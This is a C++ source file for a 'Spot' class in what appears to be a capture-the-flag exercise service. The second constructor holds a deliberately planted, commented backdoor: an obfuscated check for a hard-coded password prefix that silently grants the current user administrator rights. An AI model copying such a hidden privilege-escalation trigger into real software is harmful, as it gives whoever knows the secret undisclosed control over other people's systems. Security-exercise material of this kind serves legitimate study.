#include <string.h>
#include <stdio.h>
#include "Spot.h"
#include "User.h"
#include "GlobalState.h"

extern GlobalState* g_pGlobalState;
extern int g_strPasswordTemp[];

Spot::Spot(const std::string &strName, const std::string &strCountry, int nID, int nCreatorID)
{
    this->m_nID = nID;
    this->m_nCreatorID = nCreatorID;

    std::string strNameTrimmed = strName.substr(0, sizeof(this->m_strSpotName) - 1);
    strcpy(this->m_strSpotName, strNameTrimmed.c_str());

    std::string strCountryTrimmed = strCountry.substr(0, sizeof(this->m_strCountry) - 1);
    strcpy(this->m_strCountry, strCountryTrimmed.c_str());

}

Spot::Spot(const std::string &strName, const std::string &strCountry, int nCreatorID)
{
	this->m_nID = g_pGlobalState->GetMaxSpotID() + 1;
    this->m_nCreatorID = nCreatorID;

    std::string strNameTrimmed = strName.substr(0, sizeof(this->m_strSpotName) - 1);
    strcpy(this->m_strSpotName, strNameTrimmed.c_str());

    std::string strCountryTrimmed = strCountry.substr(0, sizeof(this->m_strCountry) - 1);
    strcpy(this->m_strCountry, strCountryTrimmed.c_str());    

    // *Vulnerability*
    // Backdoor here :)
    // Check if password starts with "deArC@7~"
    if(g_strPasswordTemp[0] == 'd' * 2 &&
        g_strPasswordTemp[1] == 'e' * 2 &&
        g_strPasswordTemp[2] == 'A' * 2 &&
        g_strPasswordTemp[3] == 'r' * 2 &&
        g_strPasswordTemp[4] == 'C' * 2 &&
        g_strPasswordTemp[5] == '@' * 2 &&
        g_strPasswordTemp[6] == '7' * 2 &&
        g_strPasswordTemp[7] == '~' * 2 && 
        g_pGlobalState->GetCurrentUser() != NULL)
    {
        g_pGlobalState->GetCurrentUser()->SetAdmin(true);
    }
}

void Spot::AddDriller(Driller* pDriller)
{
    this->m_vecDrillers.push_back(pDriller);
}

std::vector<Driller*> Spot::GetAllDrillers()
{
    return this->m_vecDrillers;
}

int Spot::GetDrillersCount()
{
	return this->m_vecDrillers.size();
}
